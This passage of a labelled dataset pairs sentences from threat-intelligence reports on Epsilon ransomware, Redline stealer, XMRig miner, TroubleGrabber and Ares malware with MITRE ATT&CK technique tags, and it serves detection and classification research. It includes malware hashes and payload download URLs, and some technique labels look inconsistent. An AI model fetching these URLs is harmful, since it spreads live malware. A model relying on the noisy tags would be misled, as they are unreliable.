["T1547"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "It will enumerate through the the system drives\u00a0to encrypt the files using double encryption.", "labels": ["T1083", "T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "First, it encrypts the files with AES encryption using a randomly generated 32-bit key.", "labels": ["T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Then, those encrypted files will again be encrypted with the RC4 algorithm with a randomly generated 256-bit key.", "labels": ["T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "![Searching Drives for file encryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Drive.PNG)", "labels": ["T1083"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 5: Searching drives for file encryption*", "labels": ["T1083", "T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The custom AES algorithm using 256-bit encryption.", "labels": ["T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 6: Custom AES algorithm*", "labels": ["T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "It also uses custom RC4 encryption that has a 2048-bit variable-length key, whereas actual RC4 encryption uses a 256-bit variable-length key.", "labels": ["T1486", "T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "It downloads the ransom note image from the cdn.discordapp.com link to show on the victim\u2019s machine upon successful encryption.", "labels": ["T1105", "T1491"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 8:\u00a0Downloading* READ\\_ME.hta *file*", "labels": ["T1059"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The ransom note contains an email ID *[[email\u00a0protected]](/cdn-cgi/l/email-protection)[.]com* to communicate with the attacker for further information on payment and decryption key/software.", "labels": ["T1491"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "There is no C&C used by this ransomware variant.", "labels": ["TA0011", "T1486", "TA0011"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "![ransomware note](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Readme.PNG)", "labels": ["T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 9:\u00a0Epsilon ransomware note with email ID to contact attacker*", "labels": ["T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The ransomware deletes the shadow copies as well as the catalog to prevent victim from recovering the original\u00a0files which are now encrypted.", "labels": ["T1486", "T1490", "T1486"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "![Deleting Shadow copy and catalog](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Shadow%20Copy.PNG)", "labels": ["T1490"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 10: Deleting shadow copy and catalog*", "labels": ["T1490"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "### **Redline stealer**", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The next file we saw during our analysis is a Redline stealer.", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "We have seen multiple samples of the Redline stealer blocked in the Zscaler cloud sandbox and below is our analysis of a recent sample written in .NET.", "labels": ["T1059"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "**Redline Stealer Functionalities**", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Collects login and passwords, cookies, autocomplete fields, credit cards", "labels": ["T1606", "T1555", "TA0006"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Data collection from FTP clients, IM clients", "labels": ["T1119"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Customizable file-grabber based on path, extension", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Customizable to not work in a blacklisted country", "labels": ["T1614"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Collects information from the victim's machine: IP, country, city, current username, HWID, hardware information (video cards, processors), screenshot, screen resolution, keyboard layout, operating system, UAC settings, administrative privileges, user-agent, installed antiviruses", "labels": ["TA0009", "TA0009", "T1033", "TA0009", "T1113", "TA0009", "TA0009"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Downloads file from the URL to a specified location on the victim's machine", "labels": ["T1105"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Process injection", "labels": ["T1055"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "* Download and execute the file", "labels": ["TA0002"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Unpacked binary shows the author making use of several popular gaming application names for internal functions.", "labels": ["TA0002"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 11: Redline stealer .NET function names using popular gaming applications.*", "labels": ["T1059"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The stealer is capable of collecting data form several FTP and IM clients installed on the victim's machine as seen below:", "labels": ["TA0009", "T1005"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 12: Data collection from FTP clients, IM clients*", "labels": ["T1005"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Figure 13 shows a module that is responsible for collecting information from browsers, such as stored cookies and credit card information.", "labels": ["TA0009"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 13: Stealing credit card info*", "labels": ["T1005"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "In addition to the functions to grab data from browser, FTP, and IM clients, the malware also steals victim's cryptocurrency wallet and collects victim's geolocation, hardware information, and Client IP address.", "labels": ["T1555", "T1005"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "**SOAP over HTTP for C&C**", "labels": ["T1555", "TA0011", "TA0011"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Redline stealer uses SOAP over HTTP for C&C communication.", "labels": ["T1555", "TA0011", "T1071"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The malware is developed in .NET framework where the use of SOAP becomes very easy and also provides the additional advantage of being independent of an underlying protocol.", "labels": ["T1555", "T1059", "T1071"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 14: Getting config setting from C&C*", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "All the data being collected according to configuration settings is sent back to the C&C server.", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 15: Sending stolen client info*", "labels": ["T1041"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "After sending the collected data to the C&C server, the stealer is tasked with downloading and executing\u00a0additional payloads based on the victim's machine information.", "labels": ["TA0011", "T1041", "T1105", "T1082"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "![Gets a Task from CnC server.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Sending%20request%20to%20server%20to%20get%20a%20task.PNG)", "labels": ["TA0011"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 16: Receiving a task from the C&C server*", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The remote task action module is used to download and execute the files as instructed by the C&C server.", "labels": ["TA0011", "T1105"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "### **XMRig miner**", "labels": ["T1496"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The next malware we have been seeing in this ongoing campaign is XMRig miner.", "labels": ["T1496"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The miner\u2019s execution starts by dropping a copy of itself at", "labels": ["T1496"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The malware also changes the file permissions using the following command:", "labels": ["T1222"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "This is done to use the\u00a0miner capabilities without user permissions.", "labels": ["T1222"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The malware connects to C&C server using the following command:", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Notice the usage of PasteBin URL to store the C&C server location.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The malware then\u00a0creates\u00a0a scheduled task:", "labels": ["T1053"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The miner also tries to delete some programs that can be used to detect the miner or impact its efficiency, such as games.", "labels": ["T1496", "T1562"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The following is the list of programs the miner tries to delete:", "labels": ["T1562"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "After this, the miner is launched using the following Monero address:", "labels": ["T1496"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The Discord token grabber is a broad term used to describe attacks that use Discord tokens to steal user information.", "labels": ["TA0006"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "In this case, the stealer uses Discord app to steal data from the user and send it to a predetermined C&C server.", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Here, the program collects user information, for example, *Environment.UserName*, and sends it over using a webhook defined in the *dcWebHook.WebHook* variable.", "labels": ["T1005", "T1033", "T1567"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "### **TroubleGrabber**", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "This is a known stealer that uses Discord tokens to steal and send user data to its C&C.", "labels": ["TA0011", "T1102"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "This stealer both spreads and communicates through Discord app, using Discord URLs for attachments like *cdn[.]discordapp[.]com/attachments/[0-9]{18}/[0-9]{18}/Nameofattachment.rar*.", "labels": ["T1102"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "The name of the attachment can vary from being the name of a software application used by most users or cracked versions of games or tools, such as Discord Server Tool.exe, Galaxy Security Panel.exe, Vron Software.exe, CrackHub 2021.exe, or Vape V4 Cracked.exe.", "labels": ["T1036"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "TroubleGrabber fetches payloads from https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator to begin its next stage after being executed in the victim's machine.", "labels": ["T1105"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer2[.]vbs*", "labels": ["T1059"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*https://cdn[.]discordapp[.]com/attachments/797230131218874430/797241059254992916/Token\\_Stealer[.]bat*", "labels": ["T1059"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/raw/master/AVOID%20ME/curl[.]exe*", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "![Zscaler Cloud Sandbox report of Epsilon Ransomware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Epsilon%20sandbox%20report.PNG)", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 20: Zscaler Cloud Sandbox report of Epsilon ransomware*", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 21: Zscaler Cloud Sandbox report of Redline stealer*", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "![Zscaler Cloud Sandbox report of XMRig miner](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Sandbox%20report%20of%20XMRig%20miner.png)", "labels": ["T1496"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "*Figure 22: Zscaler Cloud Sandbox report of XMRig miner*", "labels": ["T1496"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Due to the static content distribution service, it is highly popular among threat actors to host malicious attachments that remain publicly accessible even after removing actual files from Discord.", "labels": ["T1608"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1078 | Valid Accounts | It uses valid account to access email\u00a0 |", "labels": ["T1078"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1107 | File Deletion | Self delete |", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1204 | User Execution | User interaction |", "labels": ["T1204"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1489 | Service Stop | Stop critical services |", "labels": ["T1489"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1528 | Steal Application Access Token | Steal access token for valid account |", "labels": ["T1528"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1490 | Inhibit System Recovery\u00a0 | Delete shadow copies on a system |", "labels": ["T1490"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1222 | File Directory Permissions Modification | Change directory permission to hide its file\u00a0 |", "labels": ["T1222"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1555 | Credentials from password store | Steal stored password |", "labels": ["T1555"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1056 | Keylogging | Keylog of infected machine |", "labels": ["T1056"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1056 | Keylogging | Keylog of infected machine\u00a0 |", "labels": ["T1056"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| T1055 | Process Injection | Inject code into other process |", "labels": ["T1055"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| MD5 | Malware Name | Malicious URLs / C&C |", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| f509bd9e1fbd7721c95d0d19ba317b03 | Epsilon Ransomware | https://cdn.discordapp[.]com/attachments/599226424695455755/800470210456846366/TaskHostHelper.exe |", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| 77d69cda0eebcd83f3a5e48d5f46a0d6 | Epsilon Ransomware | https://cdn.discordapp[.]com/attachments/599226424695455755/800087465523675176/65QEF.bmp |", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| 384c8470e59de327922bc5b8bc70c5f7 | Epsilon Ransomware | https://cdn.discordapp[.]com/attachments/599226424695455755/798932401216552974/READ\\_ME.hta |", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| 4f5a53d149b343503c090601552468b1 | XMRig Miner | hxxp://cdn.discordapp[.]com/attachments/789938122951098380/791391327693832202/frost-miner-pro-v1.2.exe |", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| add4a9d06d21a044336462ff9871739f | XMRig Miner | hxxp://cdn.discordapp[.]com/attachments/553272395977195520/792811479073292298/crypted.exe |", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| 55c481a5eb77786ea4a12f8509301272 | XMRig Miner | hxxps://cdn.discordapp[.]com/attachments/553272395977195520/792811479073292298/crypted.exe |", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "| b6d5b390d8248e95810e7af2e92faf5b | XMRig Miner | hxxps://cdn.discordapp[.]com/attachments/553272395977195520/797581786623901706/Summerset.exe |", "labels": [], "document": "zscaler_2021-02-09_discord-cdn-popular-choice-hosting"}, {"sentence": "Ares Malware: The Grandson of the Kronos Banking Trojan", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "*Kronos* is a banking trojan that first emerged in 2014 and marketed in underground forums as a crimeware kit to conduct credit card, identity theft, and wire fraud.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "In September 2018, a new Kronos variant named [*Osiris*](https://www.proofpoint.com/us/threat-insight/post/kronos-reborn) introduced several new features including TOR for command and control (C2) communications.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The last update to Osiris appears to have been around mid-2019.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "In February 2021, Zscaler ThreatLabz identified a new Kronos variant that surfaced via [spam campaigns to German speakers](https://blog.morphisec.com/long-live-osiris-banking-trojan-targets-german-ip-addresses), which calls itself *Ares*.", "labels": ["T1566"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Thus, the naming convention appears to refer to this new malware variant as the third generation of Kronos.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares still\u00a0appears to be in development alongside an information stealer that harvests credentials from various applications including\u00a0VPN clients, web browsers, and the malware\u00a0can exfiltrate arbitrary files and cryptocurrency wallets.", "labels": ["T1555", "TA0010"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The threat actor behind this new variant continues to use both Osiris and Ares in parallel.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "DarkCrypter", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Recent samples of Osiris and Ares have been protected by a malware packer written in C++ that calls itself *DarkCrypter*.", "labels": ["T1027"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The packer contains the PDB path d:\\scm\\Italy\\dopplegang\\DarkCrypter\\Bin\\Clean.pdb.", "labels": ["T1027"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The code is not related to the\u00a0commercial packer,\u00a0DarkCrypter, that has been [cracked and leaked online](https://github.com/0x4xLEAKR/DarkCrypter).", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Interestingly, the packer\u00a0shares code with Kronos and Osiris including the string encryption algorithm.", "labels": ["T1027"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "When the string table is decrypted, the first 41 entries are identical to older Kronos variants with eight new string additions (shown below) to detect sandbox environments:", "labels": ["T1497"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "If the anti-analysis checks pass, the packer proceeds to the next step.", "labels": ["T1497", "T1027"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "There are at least two variants of the packer.", "labels": ["T1027"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The first variant decrypts the next-stage payload using Blowfish.", "labels": ["T1140"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "However, the Blowfish decryption implementation in DarkCrypter supports a hardcoded key size that is 288 bytes (although only the first 72 bytes are effectively used).", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The second variant of the DarkCrypter packer embeds the second-stage payload in a compressed format rather than an encrypted Blowfish format.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The compression algorithm is identical to that found in Ares, and components related to\u00a0Ares, including a\u00a0packer that\u00a0impersonates a bitmap image header.", "labels": ["T1027", "T1036"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Modified UPX Packer", "labels": ["T1027"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The threat actor has also experimented with modifying UPX headers, which has well known section names.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The modifications that have been made by the threat actor replace the UPX section names (UPX0, UPX1, ...", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "This breaks compatibility with the command-line UPX decompression tool, although the file can still be decompressed and executed.", "labels": ["T1140"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Modified and Restored UPX Headers", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "These changes can easily be restored to the original UPX section names as shown on the right in Figure 1.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The UPX command-line utility can then be used to statically unpack this binary, producing the final executable payload.", "labels": ["T1140"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "BMPack", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The threat actor has also been using another packer that Zscaler ThreatLabZ has dubbed BMPack.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "This packer has been utilized to pack both Osiris and Ares payloads.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "BMPack first decrypts embedded data using an XOR-based algorithm, followed by RC4.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "After the decryption stage, the file appears to be a bitmap image as shown in Figure 2.", "labels": ["T1140", "T1027"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Fake Bitmap Image Used to Unpack\u00a0Osiris and Ares Malware\u00a0Payloads", "labels": ["T1140"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "However, a closer inspection reveals that the data is not actually a bitmap image, but has a specific sequence of data structures.", "labels": ["T1036"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Format of BMPack Data Structures", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Each decompressed structure holds a different section of a PE file that is reconstructed and stitched together by a custom loader, and executed.", "labels": ["T1140", "TA0002"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares Malware", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares is being actively developed and the malware author continues to create and test new plugins and web injects.", "labels": ["T1189"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "In the most recent Ares samples, there is an embedded DLL module that is compressed within the binary.", "labels": ["T1027"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The module contains an export that is designed to establish persistence.", "labels": ["TA0003"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The code first copies itself to the location %APPDATA%\\Adobe\\AdobeNotificationUpdates.exe.", "labels": ["T1036"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "It then creates a scheduled task named *AdobeNotificationUpdates* that is designed to execute Ares every two hours (with an expiration date of 2050-05-02 12:05:00).", "labels": ["T1036", "T1053"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Similar persistence code is also found in many DarkCrypter samples.", "labels": ["TA0003"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The Ares persistence module has the same compilation prefix as other modules in its PDB path D:\\scm\\Italy\\ares\\source\\_ob\\Release\\startup.pdb.", "labels": ["TA0003"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares attempts to locate an export name with the hash value F4S4G3S4U7C6P2P7, which maps to the string\u00a0[[email\u00a0protected]](/cdn-cgi/l/email-protection)@[[email\u00a0protected]](/cdn-cgi/l/email-protection).", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Once the address of this function is located, Ares executes the module.", "labels": ["TA0002", "TA0002"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares uses the same function hashing algorithm as Kronos, which consists of calculating a CRC64 hash, converting the digest to uppercase hexadecimal characters.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The result is then mapped to an alphanumeric value as shown in the Python code below:", "labels": ["T1059"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares contains most of the same code as its predecessors:\u00a0Kronos and Osiris.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "However, there are several notable differences between Osiris and Ares, especially with respect to the C2 communications.", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Most Ares samples currently do not communicate with C2 servers over TOR.", "labels": ["TA0011", "T1071"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "It is not quite clear, why most Ares samples have the TOR component removed, but it may be to reduce\u00a0the malware's file size and evade corporate firewalls that block TOR network traffic.", "labels": ["TA0005"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "However, without TOR, the C2 servers are more vulnerable to takedown attempts.", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Some Ares samples attempt to address this limitation by hardcoding a large number of C2 URLs in the binary.", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Zscaler ThreatLabz has observed one Ares sample with [101 hardcoded C2 URLs](https://pastebin.com/XU6YfvWG).", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares has also slightly modified the bot ID generation code, replacing the string Kronos with the string Ares as shown in Figure 4.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Comparison Between Kronos and Ares Bot ID Generation\u00a0", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares uses the HTTP query string parameters shown in Table 1.", "labels": ["T1071"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The HTTP request that sends the report.zip file is unique to Ares and\u00a0discussed in more detail below.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| a=0 | Send log data |", "labels": ["T1041"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| a=1 | Download web injects |", "labels": ["T1105"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| a=2 | Send keylogger data |", "labels": ["T1041"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| a=3 | Send\u00a0report.zip file created by Ares Stealer |", "labels": ["T1041"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| a=4 | Request new commands |", "labels": ["TA0011"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares Query String Parameters", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "### Ares Commands", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "Ares supports many of the same commands as Kronos and Osiris.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "There are four modified commands that are supported by Ares as shown below in Table 2.", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 0x3 | Set registry value name MSE to 0 |", "labels": ["T1112"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 0x4 | Set registry value name MSE to 1 |", "labels": ["T1112"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 0x6 | Download, decompress, map Ares Stealer into memory, and execute |", "labels": ["T1105"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "| 0xC | Download, decompress, map module into memory, and execute |", "labels": ["T1105"], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "New Commands Introduced By Ares", "labels": [], "document": "zscaler_2021-03-30_ares-malware-grandson-kronos-banking"}, {"sentence": "The commands 0x3\u00a0and 